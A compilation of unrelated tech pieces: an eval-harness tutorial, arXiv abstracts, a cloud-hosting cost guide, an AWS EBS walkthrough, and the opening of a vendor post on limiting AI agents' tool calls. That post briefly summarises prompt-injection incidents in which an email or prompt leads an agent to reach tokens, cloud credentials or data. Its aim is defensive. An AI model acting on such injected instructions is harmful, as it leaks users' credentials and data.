title: A prompt change is a code change. Gate it in CI with 60 lines of node:test
description:
Agents and AI features change in a way normal code doesn't. Someone tweaks a prompt, bumps the model version, or adds a line of context, and the code review shows a three-line diff. The tests pass. Nothing in the pipeline knows that the summaries now invent refund amounts.

We review code changes by reading them. We can't review prompt changes that way, because the effect isn't in the diff. It's in the outputs. So the review has to run the outputs.

Here is the small harness we put in front of every AI feature before it ships. It's plain node:test, a JSON file of cases, and about 60 lines. No eval framework, no dashboard. It fails CI when the answers get worse, which is the only job it has.

1. Write cases from real inputs

Start with 20 to 50 real inputs, taken from logs or support tickets (with personal data removed). For each one, write down what a good answer must contain and must not contain. You're not writing the perfect answer. You're writing the things that make an answer wrong.

[
  {
    "id": "refund-amount",
    "input": "Hi, order 1182 arrived broken. I paid $42.50. Please refund me.",
    "mustInclude": ["$42.50", "refund"],
    "mustNotInclude": ["angry"],
    "maxChars": 300
  },
  {
    "id": "no-amount-given",
    "input": "Order 1182 never arrived. I want my money back for order 1182.",
    "mustInclude": ["refund"],
    "maxChars": 300
  }
]

The second case matters as much as the first. The customer didn't give an amount, so the right summary doesn't contain one. Cases where the correct answer is "I don't know" are where models most often make things up.

2. Check what can be checked in code

You can't check in code whether a summary is good. You can check a surprising number of ways it's bad:

// evals/check.js
export function check(output, c) {
  const problems = [];

  for (const s of c.mustInclude ?? []) {
    if (!output.includes(s)) problems.push(`missing "${s}"`);
  }
  for (const s of c.mustNotInclude ?? []) {
    if (output.includes(s)) problems.push(`contains "${s}"`);
  }
  if (c.maxChars && output.length > c.maxChars) {
    problems.push(`too long (${output.length} chars)`);
  }

  // Every number in the answer must appear in the input.
  for (const n of output.match(/\d[\d,.]*\d|\d/g) ?? []) {
    if (!c.input.includes(n)) problems.push(`invented number ${n}`);
  }
  return problems;
}

The last check is the one that earns its keep. Any number in the output that isn't in the input was invented: an amount, a date, an order ID. It's strict and occasionally flags something harmless, like "2 items" when the input said "two items". That's a fair trade for catching the summary that tells your support team to refund $45.00 instead of $42.50.

3. Gate on the pass rate, not on every case

Models aren't deterministic, and a few cases will be borderline. If every case has to pass, the suite turns red on noise and people learn to ignore it. Gate on the overall rate instead:

// evals/summary.test.js
import test, { after } from "node:test";
import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { summarizeTicket } from "../src/summarize.js";
import { check } from "./check.js";

const cases = JSON.parse(await readFile(new URL("./cases.json", import.meta.url)));
const MIN_PASS_RATE = Number(process.env.EVAL_MIN_PASS_RATE ?? 0.9);
const results = [];

for (const c of cases) {
  test(c.id, async (t) => {
    const output = await summarizeTicket(c.input);
    const problems = check(output, c);
    results.push({ id: c.id, ok: problems.length === 0 });
    if (problems.length) t.diagnostic(`${problems.join("; ")} | output: ${output}`);
  });
}

after(() => {
  const passed = results.filter((r) => r.ok).length;
  const rate = passed / results.length;
  console.log(`evals: ${passed}/${results.length} passed (${(rate * 100).toFixed(0)}%)`);
  assert.ok(rate >= MIN_PASS_RATE, `pass rate ${rate.toFixed(2)} is below ${MIN_PASS_RATE}`);
});

Each case still prints its problems and the actual output, so when the gate fails you can see why without rerunning anything. With a version of summarizeTicket that invents the amount, the run looks like this and exits with code 1:

# missing "$42.50"; contains "angry"; invented number 45.00 | output: Customer wants a refund of $45.00 and is angry.
# evals: 0/2 passed (0%)
  error: 'pass rate 0.00 is below 0.9'

Start the threshold where your current prompt actually scores, then raise it as you fix cases. The point is that it can only go up.

4. Run it only when it matters

Every eval run calls the model, which costs money and takes a minute. There's no reason to run it on a CSS change. Trigger it on the files that change model behaviour:

# .github/workflows/evals.yml
name: evals
on:
  pull_request:
    paths:
      - "src/prompts/**"
      - "src/summarize.js"
      - "evals/**"
jobs:
  evals:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
      - run: npm ci
      - run: node --test evals/*.test.js
        env:
          MODEL_API_KEY: ${{ secrets.MODEL_API_KEY }}

Do the same thing by hand before switching model versions. When your provider retires the version you tested on, this suite is the difference between a one-day upgrade and finding out from customers.

5. Add a case for every bug

When someone reports a bad answer in production, don't just fix the prompt. Add the input as a case first, watch it fail, then fix the prompt until it passes. It's the same habit as writing a regression test for a bug, and it's how the suite grows from 20 cases to the 200 that actually describe your users.

What this doesn't replace

Code checks catch answers that are wrong in ways you predicted. They don't tell you whether an answer is helpful, well-toned or complete. For that you still need a person reading a sample every week, or a second model grading against a rubric, which is its own post.

But the gate comes first. It's an afternoon of work, it runs on infrastructure you already have, and it means a prompt change gets the same treatment as a code change: it doesn't merge until something has checked what it actually does.

I'm Mayursinh, founder of Redlio Labs. We add AI features to custom software for mid-size companies, and this harness goes in before the first prompt does. The harness above was run with Node 22, against a good and a deliberately broken summarizer.

title: Design systems: From the basics to big things ahead
description: To prepare for Schema 2025, we combed through Shortcut archives to pull together our design systems greatest hits.

title: Readie: Low-Latency Code Sandboxes for AI Agents
description:
arXiv:2611.22171v1 Announce Type: new 
Abstract: From quantitative research to personal assistance, AI agents act by iteratively generating and executing code. To decouple the agent harness from code execution, many agents offload execution to dedicated systems called code sandboxes. However, existing code sandboxes suffer from slow startup. Whether they rely on custom snapshots or a single fat image, the root cause is the same: it is hard to build a compact, pre-warmed snapshot that can be shared across diverse agent-generated code while covering nearly all the artifacts (e.g., packages, datasets) it requires.
  In this work, we propose learned startup snapshots for low-latency code sandboxes. Our insight is that while it is hard for a single snapshot to be both compact and cover most workloads, a set of snapshots can achieve both. Each snapshot is small, initializes quickly, and covers a fraction of agent-generated code; together, the set covers most of it. We learn this set from a large training workload by formulating snapshot construction as an optimization problem and solving it with an approximation algorithm. Planned on 15K public and LLM-synthesized scripts, our system, Readie, reduces startup latency by 3-22$\times$ and end-to-end runtime by 1.3-3.3$\times$ compared to existing approaches at the same storage budget.

title: PVTSizing 2.0: A Fast and Reliable Analog Circuit Sizing Operator for Agentic EDA Workflows
description:
arXiv:2611.22328v1 Announce Type: cross 
Abstract: Analog circuit design automation requires both coordinated tool execution and efficient numerical search. Large language models (LLMs) offer new ways to organize tool execution, but finding one sizing that satisfies specifications across process, voltage, and temperature (PVT) corners remains costly. PVTSizing 2.0 addresses these needs through a human-agent workflow built around an independently usable numerical optimizer. An agent carries the designer's approved task through execution and result review. The optimizer reduces unnecessary training through loss-guided updates and uses critic-guided local refinement to explore additional candidates while accounting for cross-corner conflicts. An optional LLM adviser supplies parameter relationships to focus numerical search on circuit-informed directions, while the optimizer selects adjustment amplitudes and verifies their effects through simulation. Across four circuit benchmarks, the standalone optimizer completes all 40 runs and achieves a 7.3x speedup in overall mean runtime over the original PVTSizing, with a comparable mean sample count. In a separate study, the best tested knowledge-injection configuration further reduces mean runtime by 39.9% and simulation samples by 35.4% relative to the standalone optimizer.

title: Call-Efficient ICD-10 Code Prediction via Supervised Candidate Generation and Selective LLM Invocation
description:
arXiv:2611.21891v1 Announce Type: new 
Abstract: Automatic assignment of ICD-10 codes from short clinical diagnosis text is a practical medical text classification and normalization task. The task is difficult because diagnosis phrases are short and noisy, the ICD-10 label space is hierarchical, and the class distribution is strongly imbalanced. This paper presents a call-efficient ICD-10 code prediction pipeline that combines transformer embeddings, tree-based supervised candidate generation, candidate-level reranking, and a gated LLM assistance. The evaluation uses a leakage-safe validation protocol: model and threshold selection are based on out-of-fold cross-validation predictions, while final reporting is performed on a locked test set with no shared source-file groups. The supervised conditional parent-code candidate generator reaches 74.32% Top-1 accuracy on the locked test set and 93.05% Top-10 candidate coverage. A direct zero-shot GPT-5.6-Sol baseline reaches 81.01% Top-1 accuracy, but requires an invocation of this large model for every diagnosis. The final deployable system, Pre-LLM fusion, reaches 81.24% OOF-CV accuracy and 83.19% locked-test accuracy while calling the LLM for only 31.97% of cases. This improves the locked-test error rate from 25.68% for the supervised parent-code baseline to 16.81%, corresponding to a 34.5% relative error reduction. The results show that the most effective role of the LLM is controlled reranking on uncertain examples rather than unrestricted coding or full-dataset invocation.

title: Modeling Document and Section Hierarchies in Embedding Space
description:
arXiv:2611.21980v1 Announce Type: cross 
Abstract: Embedded topic models integrate word embeddings into the topic generation process, producing coherent topics and robust performance on large vocabularies. However, each document is represented by a single topic distribution, ignoring its internal structure. Many real world collections, including legal documents, company and government reports, and online discussion forums, exhibit hierarchical organization in which documents consist of multiple sections that often address distinct subtopics. We introduce the Hierarchical Embedded Topic Model (hETM), a structured topic model that couples the topic distribution of a document and those of its sections through a hierarchical prior in the embedding space. We derive an amortized variational inference procedure for hETM and evaluate it on structured collections from each of these domains. Experimental results show that hETM achieves the lowest or near-lowest held-out perplexity among flat and hierarchical topic model baselines, along with comparable or higher topic quality. It also performs strongly on a downstream clustering task, achieving the best clustering performance on most of the collections.

title: Cheapest Cloud Hosting Platforms in 2026: Compare the Full Cost
description:
TL;DR

  • There's no universal cheapest cloud hosting platform in 2026. Start with a managed platform like Render or Northflank if you want infrastructure handled for you, and use unmanaged VMs like DigitalOcean Droplets only when your team wants to take on the extra server and database upkeep.
  • Think in terms of total cost of operation (TCO) rather than headline instance prices. Add up compute, databases, storage, backups, transfer, workspace fees, builds, and observability on the provider bill, then account for your team's ongoing engineering time alongside it.
  • Vercel, Supabase, and Neon cover different parts of an application stack, so their subscriptions aren't equivalent hosting quotes.
  • Model the same workload and recovery requirements before comparing bills. Scale-to-zero can reduce idle compute charges without eliminating storage or other costs.
  • Choose a full-stack managed platform like Render when you want persistent web services, background workers, and managed PostgreSQL in one place, with Git deployments, automatic SSL, and private networking built in.

You have an application ready to ship, several pricing tabs open, and plans that seem to describe entirely different products.

Look closely at what each tab actually gives you. One quotes a blank virtual machine where you install and maintain everything yourself. Another covers frontend hosting and serverless functions without a database, and a third prices standalone Postgres with nowhere to run your backend API. Comparing their starting prices side by side is misleading because most of them leave half your architecture off the quote.

Before I commit to a hosting setup, I want clear answers on four points:

  • What happens to the database
  • How much data you can afford to lose
  • Who restores it
  • Whether the advertised transfer allowance covers responses to your customers

We'll examine what a complete cloud hosting bill includes, compare affordable cloud hosting options by what they provide, model comparable small application workloads, and estimate engineering time instead of treating it as free.

What a complete cloud hosting bill includes

I separate the provider's invoice from the estimated economic value of the team's work. Both matter, and mixing them hides where your money and engineering hours actually go.

Full-cost equation

Provider bill =
  application compute + database compute + persistent storage
  + backups + network transfer + platform and team fees
  + applicable builds and observability

Estimated recurring full cost =
  provider bill + estimated recurring engineering labor

Providers meter compute either through continuously allocated instances (billed while provisioned, including idle periods) or through usage metrics such as requests, CPU seconds, and active memory. Many platforms combine a base workspace or plan fee with usage allowances and per-unit overages.

Internet egress is data leaving a provider's network for the public internet. Map public client responses, application-to-database queries, and cross-region or cross-provider traffic separately, and include dedicated IPv4 addresses, NAT gateways, or load balancers whenever your topology requires them. Render's billing guide shows how network topology changes those lines.

Hold region, currency, traffic, compute sizing, database capacity, availability, and recovery targets constant across every quote. Matching RAM labels alone doesn't guarantee equivalent performance.

Recovery also carries distinct price tags. Your recovery-point objective (RPO) sets how much recent data you can afford to lose, recovery-time objective (RTO) sets how fast service must return, and retention sets how far back recovery history goes. Scheduled backups store recovery copies, point-in-time recovery (PITR) restores to a specific moment within your retention window, and high availability runs redundant standby infrastructure for automated failover. As Render's database pricing guide details, dropping a resilience feature you actually need creates an illusion of savings rather than an equivalent quote.

Compare affordable cloud hosting options by what they provide

Affordable cloud hosting falls into three operating models: full-stack managed platforms, self-managed servers (with optional deployment tooling), and specialist services that only run one layer of your app. For most product teams without dedicated infrastructure staff, a full-stack managed platform hits the practical TCO sweet spot because one platform handles your web services, background jobs, database, TLS, and internal networking on a single bill.

Option Stack coverage and billing model What your team still owns Best fit
Render Full-stack managed platform for web services, background workers, cron jobs, static sites, managed Postgres (with PITR included on paid plans), and Key Value over a free private network. Predictable instance tiers plus workspace plan and overages Application code, instance sizing, schema migrations, and restore validation Default choice when you want your entire app and database stack managed in one place
Northflank Managed container services, jobs, and database add-ons on Northflank Cloud or your own cloud VPC, metered per second across vCPU, memory, disk, and egress Application operation, container/cluster configuration, and BYOC cloud account management Teams wanting granular container controls or bring-your-own-cloud deployments
DigitalOcean Droplets Unmanaged Linux VMs where you can run apps and self-hosted PostgreSQL, billed by VM size plus optional backup, volume, and transfer add-ons OS patching, firewalls, TLS, deploy pipelines, database administration, and recovery Teams with existing Linux and database ops automation
Coolify Open-source deployment control plane (self-hosted free or Coolify Cloud subscription) layered onto VMs you rent separately Underlying workload servers, host security, OS updates, and application database backups Developers who want Heroku-style Git deploys on their own cheap VPS hardware
Vercel Frontend CDN delivery and serverless function execution, billed by plan, team seats, and metered usage Pairing an external database and separate host for persistent workers or long-running backends Frontend-heavy Next.js apps whose backend fits serverless execution
Supabase Managed Postgres bundled with Auth, Storage, Realtime, and Edge Functions, billed by org plan plus per-project compute, storage, and add-ons (such as PITR) Hosting custom persistent APIs, frontends, and background workers elsewhere Apps built directly around Supabase's bundled Postgres and auth primitives
Neon Serverless Postgres with scale-to-zero, branching, and backend primitives, metered by compute unit-hours and stored data Hosting your web frontend, persistent API servers, and background workers elsewhere Variable or multi-tenant Postgres workloads paired with a separate app host

Looking at the shortlist through a TCO lens exposes two common traps. Going down-market to raw Droplets or Coolify lowers the monthly server line, although you still pay for workload VMs and inherit every OS patch, firewall rule, and database restore yourself (Coolify Cloud only backs up its control plane, and even within DigitalOcean, Droplets, App Platform, and Managed Databases are separate products). Going sideways into specialist tools splits your architecture across vendors: Supabase notes its custom-domain feature isn't meant for frontend hosting via Edge Functions, and neither Neon nor Vercel gives you persistent background workers and managed Postgres under one roof.

That's why I lean toward a unified platform like Render as the starting baseline for a typical SaaS or API team. Checking Render's documentation and workspace plans, you get Git or Docker deploys, automatic SSL, private networking, and managed Postgres without assembling glue between three billing dashboards, whereas Northflank makes sense if you specifically need BYOC cluster workflows.

Model comparable small application workloads

A grounded cloud hosting cost comparison starts from fixed workload inputs. Take a small always-on production stack in US East billed monthly in USD: one web API with roughly 1 vCPU and 1 to 2 GB RAM, one PostgreSQL database with 1 vCPU, 1 GB RAM, and 10 GB of stored data plus disk headroom, 10 GB of monthly public API responses, and a 7-day recovery window targeting a 24-hour RPO and RTO without multi-node high availability.

Rather than building seven repetitive spreadsheets, let's model the two archetypes at opposite ends of the ownership spectrum: Render for a unified full-stack managed platform, and DigitalOcean Droplets for raw self-managed VMs. Every other option maps onto or between those two baselines. Northflank follows a similar managed-platform structure with container metering, Coolify layers a control plane onto that same VM bill, and Vercel, Supabase, or Neon each require a second vendor to cover both the persistent API and Postgres.

On Render, you price a fixed monthly web service tier for the API alongside a separate managed Render Postgres compute tier and expandable per-GB database storage. That quote already bundles Git or Docker deployments, zero-downtime rollbacks, automatic TLS, health checks, and built-in log retention, with monthly build-pipeline minutes and team controls governed by your workspace plan.

Recovery and networking widen that functional gap. Paid Render Postgres plans include continuous point-in-time recovery and logical exports without a separate backup-retention surcharge, and internal API-to-database queries in the same workspace and region travel free over Render's private network. On DigitalOcean Droplets, you rent two Linux VMs (colocating the API and Postgres on one machine saves an instance fee at the cost of shared resource contention and a single failure domain). Enabling DigitalOcean's paid Droplet backup add-on only captures VM-level disk snapshots, so meeting a real PostgreSQL recovery target still requires wiring up logical dumps or WAL archiving to separate object storage yourself.

On raw server invoices alone, two unmanaged Droplets will normally price out lower than a managed web-plus-database stack on Render, and Droplets bundle generous outbound transfer pools with no workspace fee. What that lower invoice leaves off the page is everything around the VMs: CI build runners, reverse proxies, TLS renewal, VPC firewall rules, monitoring, and tested database restores all become infrastructure your team has to assemble and maintain.

Two common variations change these baselines predictably:

  • Scale-to-zero databases such as Neon suspend compute after idle periods (five minutes by default on Free and Launch), cutting idle compute spend while retained storage stays billable. Splitting your frontend and backend across Vercel plus Supabase or Neon adds separate plan floors, cross-provider database traffic, and combined wake-up latency on cold requests.
  • Adding a background worker or cron job introduces its own compute line, and upgrading from backups to automated failover adds standby database nodes, such as a matching standby on Render Postgres or DigitalOcean Managed PostgreSQL. Avoid substituting a stripped-down tier like DigitalOcean App Platform's development database, which omits default backups.

Estimate engineering time instead of treating it as free

Even on a managed platform, your team retains real operational work. The table below models illustrative monthly hours for a small production service so labor stays visible alongside the provider invoice. Swap in your own hours and loaded engineering rate.

Task Management boundary Managed hours Self-managed hours
Patching Provider base infrastructure where covered, team application dependencies 0.25 1
Infrastructure changes Provider mechanisms, team configuration 0.25 0.5
Database maintenance Provider service maintenance where covered, team schema and queries 0.25 0.5
Backup verification Team verifies usable recovery 0.5 0.75
Monitoring Team owns application health 0.5 0.5
Deployment debugging Team 0.5 0.5
Incident allowance Shared according to failure 0.75 1.25
Total hypothetical hours 3 5

At an illustrative $100 per engineering hour, recurring operations represent $300 per month on a managed platform versus $500 per month self-managed. Strong existing Terraform/Ansible automation and Linux expertise might pull self-managed upkeep down to 2 hours ($200/month), whereas a product-focused startup without dedicated ops engineers will feel every hour pulled away from shipping features.

Track one-time setup (say, 4 hours managed vs. 8 hours self-managed) and future migration effort separately rather than folding them into monthly run rate or pretending they cost zero.

Weigh the tradeoffs across simplicity, cost, and scale

Start by ruling out any setup that misses a non-negotiable requirement on availability, recovery window, region, or compliance. Skipping database recovery to shave a few dollars off a quote creates risk rather than savings.

From the viable options left, match the operating model to what your team actually optimizes for. Choose a full-stack managed platform like Render when operational simplicity and shipping speed come first across your web services, workers, networking, and managed Postgres, or pick Northflank when you need granular container controls or bring-your-own-cloud VPC deployments. Run DigitalOcean Droplets (with or without Coolify) when minimizing the raw server bill matters most and your team already maintains Linux and backup automation, and pair Vercel with Neon or Supabase when your architecture centers on serverless frontends or scale-to-zero branching databases.

Whichever path fits your team, pressure-test the one variable most likely to swing your bill, whether that's outbound egress, database growth, or maintenance hours, and run a real restore drill before production cutover.

Conclusion

Chasing the lowest sticker price on a pricing page rarely produces the lowest total cost of operation. Once you include database recovery, outbound transfer, and the engineering hours spent keeping servers healthy, the real question is which operational tradeoffs fit your team.

For most product teams without dedicated infrastructure staff, starting on a full-stack managed platform like Render is the practical default. Running web services, background workers, private networking, and managed Postgres in one place eliminates both DIY server maintenance and the billing sprawl of stitching separate frontend and database vendors together.

Self-managed VMs and specialist serverless stacks still earn their keep when you already have mature ops automation or strictly spiky workloads. Keep the provider invoice, recurring engineering hours, and recovery plan visible side by side, and choose the stack built for the team you actually have.

Frequently asked questions

What is the cheapest cloud hosting platform?

There's no universally cheapest cloud hosting platform. Look at total cost of operation (TCO) rather than headline server rates by adding up application and database compute, storage, backups, network transfer, and workspace fees on the provider bill, then accounting for ongoing engineering labor alongside it. For most product teams without dedicated ops staff, a full-stack managed platform like Render avoids both DIY server upkeep and multi-vendor billing sprawl.

Is a VPS cheaper than a managed cloud platform?

A VPS can have a lower infrastructure invoice than a managed cloud platform, but that doesn't establish a lower full cost. Include database protection, storage, network charges, and the time needed to maintain and recover the stack. Existing server expertise and automation can substantially reduce the incremental work for your team.

Does a platform subscription include compute and a database?

A platform subscription may include compute or database usage, but coverage varies by plan. Check workspace or seat charges separately from application resources, database resources, and included usage. For example, Render prices its managed PostgreSQL separately from application services, so a workspace plan alone isn't a complete application-and-database quote.

Can free cloud hosting support a production application?

Free cloud hosting can support a production application if its terms and capabilities meet that application's requirements. Check commercial eligibility, uptime behavior, resource limits, data persistence, recovery, and support before relying on a free tier. Keep promotional credits out of the recurring baseline, or show separately when they expire.

Can Supabase or Neon replace an application host?

Supabase and Neon pair PostgreSQL with backend primitives such as authentication, data APIs, and serverless functions, although neither subscription replaces a host for persistent custom web servers or background workers. Unless your entire backend fits inside their functions, you either pair them with a separate application host or run your web services, workers, and managed Postgres together on a full-stack platform like Render.

title: One Disk, Two Servers: How Amazon EBS Volumes Move Between EC2 Instances
description:
Introduction

When you launch an EC2 instance, it feels like the server and its disk are one thing. They aren't. The disk is a separate resource called an Amazon EBS volume (Elastic Block Store), and it can live on after the server is gone. You can also unplug it from one server and plug it into another, and your data comes along.

In this walkthrough, you'll:

  1. Launch an EC2 instance and look at its root volume
  2. Create a new 20 GiB EBS volume and attach it to the instance
  3. Format it, mount it, and make the mount survive reboots
  4. Write a file to it
  5. Detach it and attach it to a second instance, then read the same file there
  6. Terminate both instances and see which volumes survive, then clean up

By the end, you'll understand what EBS is and how it behaves.

What is Amazon EBS?

EBS is block storage for EC2. To the operating system, an EBS volume looks like a physical hard drive: you partition it, format it with a filesystem, and mount it. Under the hood, it's storage that AWS provides over its network.

A few things to know before you start:

  • A volume lives in one Availability Zone (AZ). You can only attach a volume to an instance in the same AZ. A volume in eu-north-1b can't attach to an instance in eu-north-1a.
  • A volume normally attaches to one instance at a time. (Multi-Attach exists for io1/io2 volumes, but that's a special case.)
  • Volumes exist independently of instances. Stopping an instance doesn't delete its volumes. By default, terminating one deletes only the root volume. Extra volumes you attach yourself are kept.
  • Every instance has a root volume. That's where the OS is installed. Any other volume you add is a data volume.

Step 1: Launch an EC2 instance

Open the AWS console and search for EC2.

Launch an instance. For this demo I used:

  • AMI: Ubuntu 26.04
  • Instance type: t3.micro
  • Storage: the default 8 GiB gp3 root volume

The Configure storage section is your first look at EBS. That 8 GiB volume is the instance's root volume, where Ubuntu gets installed.

Once it launches, note the Availability Zone. Mine is eu-north-1b, and every volume you attach to this instance has to be created in that AZ.

Now go to Elastic Block Store → Volumes. There's already one volume there, even though you didn't create one. It's the root volume that came with the instance.

Step 2: Create a new EBS volume

Click Create volume and fill in:

  • Volume type: General Purpose SSD (gp2). gp3 is also fine, and it's usually cheaper with better baseline performance.
  • Size: 20 GiB
  • Availability Zone: the same AZ as your instance (eu-north-1b)
  • Tag: Name = ebsdemo, so it's easy to spot in the list

The IOPS line under the size is worth a look: 100 / 3000. A gp2 volume gets 3 IOPS per GiB, with a minimum of 100, and can burst up to 3,000. A gp3 volume gets 3,000 IOPS whatever its size.

Click Create volume. It shows as Creating for a few seconds, then becomes Available.

Step 3: Attach the volume to the instance

Open the ebsdemo volume. Its state is Available, which means it exists but isn't attached to anything. Choose Actions → Attach volume.

Pick your instance and a device name. I used /dev/sdf.

The instance dropdown says "Only instances in the same Availability Zone as the selected volume are displayed." This is the AZ rule in action.

Also note the blue banner: newer Linux kernels may rename the device. You'll see what that means in a moment.

Step 4: Find the volume inside the instance

SSH into the instance and list the block devices:

lsblk

lsblk lists every disk and partition the OS can see, plus where each is mounted.

Two disks show up:

  • nvme0n1 (8G) is the root volume. Its partition nvme0n1p1 is mounted at /.
  • nvme1n1 (20G) is the new volume. It has no partitions and no mount point yet.

Where's /dev/sdf? On modern (Nitro-based) instance types, EBS volumes appear to Linux as NVMe devices. The name you picked in the console (/dev/sdf) is a label on the AWS side. Linux numbers the disks itself, so /dev/sdf becomes /dev/nvme1n1. If you're ever unsure which disk is which, this command shows each disk's EBS volume ID in the SERIAL column:

lsblk -o NAME,SIZE,SERIAL

Next, check whether the volume has a filesystem:

sudo file -s /dev/nvme1n1

file -s reads the start of the device and reports what's on it. Here the output is data, which means the volume is raw and unformatted.

Step 5: Format the volume

Create an ext4 filesystem on it:

sudo mkfs -t ext4 /dev/nvme1n1

mkfs ("make filesystem") formats the device, and -t ext4 picks the filesystem type.

⚠️ mkfs erases everything on the device. Double-check the device name, because formatting nvme0n1 would destroy your OS. Only format a volume that is new or that you deliberately want to wipe.

Run file -s again. The output now reports an ext4 filesystem with a UUID, a unique ID for this filesystem. You'll need that UUID shortly.

Step 6: Mount the volume

A filesystem has to be mounted on a folder (the "mount point") before you can use it. Create one:

sudo mkdir /demoebs

Mount the volume on it:

sudo mount /dev/nvme1n1 /demoebs

Run lsblk again. nvme1n1 now shows /demoebs as its mount point.

Check the space available:

df -h

df -h shows disk usage for each mounted filesystem in human-readable sizes. The last line shows /dev/nvme1n1: 20G, mounted on /demoebs.

Step 7: Make the mount permanent with /etc/fstab

A mount made with the mount command disappears when the instance reboots. To mount the volume automatically at boot, add it to /etc/fstab.

First, get the volume's UUID:

sudo blkid

blkid lists every filesystem with its UUID and type.

💡 Copy the UUID from the right line. blkid lists every partition, including /boot (nvme0n1p13). If you copy the /boot UUID by mistake, fstab will point at the wrong disk. Make sure you take the UUID from the /dev/nvme1n1 line.

Edit the file:

sudo vi /etc/fstab

Add this line at the bottom, using your own UUID:

UUID=a22d8831-2a0e-474f-acd3-3bdb7f5e5d92  /demoebs  ext4  defaults,nofail  0  2

Here's what each field means:

Field Meaning
UUID=... Which filesystem to mount. A UUID is safer than /dev/nvme1n1 because device names can change between boots.
/demoebs Where to mount it
ext4 The filesystem type
defaults,nofail Standard mount options. nofail lets the instance still boot if the volume is missing, which matters here because you're about to detach this volume.
0 Don't back it up with dump
2 Check the filesystem at boot, after the root disk

Without nofail, an instance whose fstab lists a missing volume can hang at boot. nofail is a small option, but it prevents that.

Confirm the UUID in fstab matches the volume:

sudo blkid /dev/nvme1n1

Step 8: Write some data

Create a file on the volume:

cd /demoebs
sudo vi tutorialfile.txt

Press i to start typing and add a line of text. Then press Esc and type :wq to save and quit.


ls

(lost+found is created automatically by ext4. It's where the filesystem puts recovered fragments after a disk check.)

This file is the proof for the next part: we'll move the disk to a different server and check whether the file is still there.

Step 9: Detach the volume from the first instance

Before detaching a volume, make sure nothing is writing to it, so no data is lost. You can either unmount it (sudo umount /demoebs) or stop the instance. I stopped the instance:

When the instance stopped, its public IPv4 address disappeared. A stopped instance gives up its public IP and gets a new one when it starts. If you need an address that never changes, use an Elastic IP.

Back in Volumes, select ebsdemo and choose Actions → Detach volume. Use the normal Detach. Force detach is a last resort for a stuck volume, because it can corrupt data.

The volume goes back to Available. It's no longer attached to any server, but the data is still on it.

Step 10: Attach it to a second instance

Launch a second instance, demoec2-2, in the same AZ (eu-north-1b). Then select ebsdemo and choose Actions → Attach volume again.

This time, choose the new instance:

The volume's Attached resources now shows demoec2-2:

SSH into the second instance. If it uses a different key pair, point ssh -i at that key. The first attempt in the screenshot fails with Permission denied (publickey) because the .pem file wasn't in the folder the command pointed to. Once the key was moved there, the login worked.

ssh -i $HOME\.ssh\demo2.pem ubuntu@<public-ip>

Step 11: Read the data on the new instance

List the disks:

lsblk

nvme1n1 (20G) is there, unmounted. Before doing anything else, check what's on it:

sudo file -s /dev/nvme1n1

It reports an ext4 filesystem with the same UUID as before (a22d8831-...). The filesystem moved with the volume.

⚠️ Do not run mkfs again. The volume already has a filesystem, and formatting it would wipe your data. Always check with file -s before formatting.

Mount it and look inside:

sudo mkdir /demoebs2
sudo mount /dev/nvme1n1 /demoebs2
cd /demoebs2
ls
cat tutorialfile.txt

The output is:

This is a new file created on demoec2

The file you wrote on the first server can be read on the second. The data belongs to the volume, not to the instance. That's the main idea of EBS: storage and compute are separate, so you can replace a server and keep its data.

Step 12: Terminate the instances and see what survives

Select both instances and choose Instance state → Terminate (delete) instance.

Read the warning in the dialog:

"On an EBS-backed instance, the default action is for the root EBS volume to be deleted when the instance is terminated."

After the instances terminate, check Volumes:

Both root volumes are gone, but ebsdemo is still there and Available. Each volume has a Delete on termination setting:

  • Root volumes: true by default, so they're deleted along with the instance.
  • Volumes you attach yourself: false by default, so they're kept.

This protects your data, but it also means leftover volumes keep costing money. AWS charges for a volume whether or not it's attached to anything.

Step 13: Clean up

Delete the volume: select it, choose Actions → Delete volume, then type delete to confirm.

Deleting a volume is permanent. If you might need the data later, choose Actions → Create snapshot first. A snapshot is a backup of the volume stored in S3, and you can create a new volume from it at any time.

Command cheat sheet

Command What it does
lsblk List disks, partitions and mount points
lsblk -o NAME,SIZE,SERIAL Match Linux device names to EBS volume IDs
sudo file -s /dev/nvme1n1 Check whether a device has a filesystem
sudo mkfs -t ext4 /dev/nvme1n1 Format a device as ext4 (erases it)
sudo mkdir /demoebs Create a mount point
sudo mount /dev/nvme1n1 /demoebs Mount the volume
df -h Show disk space for mounted filesystems
sudo blkid Show filesystem UUIDs
sudo vi /etc/fstab Edit the auto-mount configuration
sudo umount /demoebs Unmount before detaching

Summary

  • EBS volumes are separate from instances. You can create, attach, detach and reattach them on their own.
  • A volume and its instance must be in the same AZ.
  • On Nitro instances, /dev/sdf shows up as /dev/nvme1n1. Use lsblk to find the right disk.
  • Format a volume only once. Check with file -s first, especially on a volume that already has data.
  • Use a UUID and nofail in /etc/fstab. The UUID mounts the right disk, and nofail lets the instance boot without the volume.
  • Terminating an instance deletes the root volume but not extra volumes (by default). Clean up leftover volumes, or snapshot them first if you want to keep the data.

Once you understand that storage and compute are separate, the rest of EBS is easier to learn: snapshots, backups, resizing volumes, and recovering a broken server by moving its disk to a healthy one.

title: Stop the action, not the injection
description:
2026 has a pattern. A single email takes over a cloud agent and reaches its Gmail token (Salt Labs' "Manus" research). A single prompt to an AWS Bedrock AgentCore agent reaches the instance metadata service and pulls over-permissioned cloud credentials — and AWS called it "expected behavior" (Zenity, CVE-2026-18830). Microsoft 365 Copilot leaks data through indirect prompt injection again and again — Reprompt, ShareLeak, SearchLeak, CoSnitch — and in one reported case the data left even though the safety layer flagged the attack.

Different products, one failure: an agent acting with broad, inherited authority, and nothing enforcing the limit at the moment of the action. Google measured a 32% rise in malicious prompt injections in a single quarter; the Cloud Security Alliance says indirect injection has crossed from proof-of-concept to live exploitation; Anthropic says no browser agent is immune.

So stop trying to win the injection fight. You won't. The model will be fooled.

Win the next step instead. Look at what every one of those incidents actually needs to do damage: send the email, fetch the attacker's URL to exfiltrate, pay the wrong payee, invoke another agent with your credentials. The injection is the match; the tool call is the fuel. Put the control on the tool call — outside the agent, where a prompt can't reach it — and the injection buys nothing.

That is what CleiMesh does: a signed, delegable permission the gateway enforces on each tool call, with a receipt. Four things it stops — each a command you can run.

1. A spending cap the agent can't widen

Give an agent a signed allowance — one tool, one recipient, a total, a number of calls — and it acts on its own inside that, while a prompt-injected agent can't widen it, because the limit lives outside the agent, not in its prompt.

agent> pay demo $2.00       -> ok. spent $2.00 of $5.00.
